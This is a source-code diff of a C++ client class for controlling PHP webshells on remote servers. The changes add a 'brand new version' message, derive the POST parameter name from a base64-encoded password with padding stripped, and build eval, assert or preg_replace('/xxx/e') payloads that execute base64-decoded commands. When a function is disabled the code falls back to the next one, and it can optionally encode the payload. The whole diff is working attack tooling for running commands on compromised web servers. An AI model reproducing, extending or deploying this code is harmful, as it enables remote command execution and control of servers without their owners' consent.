@@ -13,6 +13,7 @@ Description:phpwebshell main class
 
 WebShell::WebShell(string addr, METHOD meth, string password, PLACE paramplace,string paramvalue):place(paramplace,paramvalue)
 {
+    cout<<"brand new version"<<endl;
 	this->url = addr;
 	this->Method = meth;
 	this->pass = password;
@@ -40,15 +41,21 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 	}
 	string  mark = to_string(1000*rand());
 	string evalphp;
+    string commandpos=cryptohelper::base64_encode(pass);
+    int badpoint=commandpos.find("=");
+    if(badpoint!=string::npos){
+        commandpos=commandpos.substr(0,badpoint);
+    }
 	if (find(disabled_functions.begin(), disabled_functions.end(), "eval") == disabled_functions.end())
-		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";eval(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
+		evalphp = "eval(base64_decode($_POST[" + commandpos + "]));";
 	else if(find(disabled_functions.begin(), disabled_functions.end(), "assert") == disabled_functions.end())
-		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";assert(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
+		evalphp = "assert(base64_decode($_POST[" + commandpos + "]));";
 	else if(find(disabled_functions.begin(), disabled_functions.end(), "preg_replace") == disabled_functions.end())
-		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";preg_replace('/xxx/e',base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']),'');echo \"" + mark + "\";";
+		evalphp = "preg_replace('/xxx/e',base64_decode($_POST[" + commandpos + "]),'');";
 	if (this->EncryptMethod.size()!=0) {
 		evalphp = this->encode(evalphp);
 	}
+    command="@ini_set(\"display_errors\",\"0\");@set_time_limit(0);echo \'"+mark+"\';"+command+";echo \'"+mark+"\';";
 	//cout << evalphp << endl;
 	map<string, string>headers;
 	map<string, string>postparams;
@@ -85,7 +92,7 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 			postparams[it->first] = it->second;
 		}
 	}
-	postparams[curlhelper::UrlEncode(cryptohelper::base64_encode(pass))] = curlhelper::UrlEncode(cryptohelper::base64_encode(command));
+	postparams[curlhelper::UrlEncode(commandpos)] = curlhelper::UrlEncode(cryptohelper::base64_encode(command));
 	for (map<string, string>::iterator it = this->addon_post.begin(); it != this->addon_post.end(); it++) {
 		map<string, string>::iterator now = postparams.find(it->first);
 		if (now != postparams.end()) now->second = it->second.replace(it->second.find("@PARAM"), it->second.find("<+>") + 3, now->first);
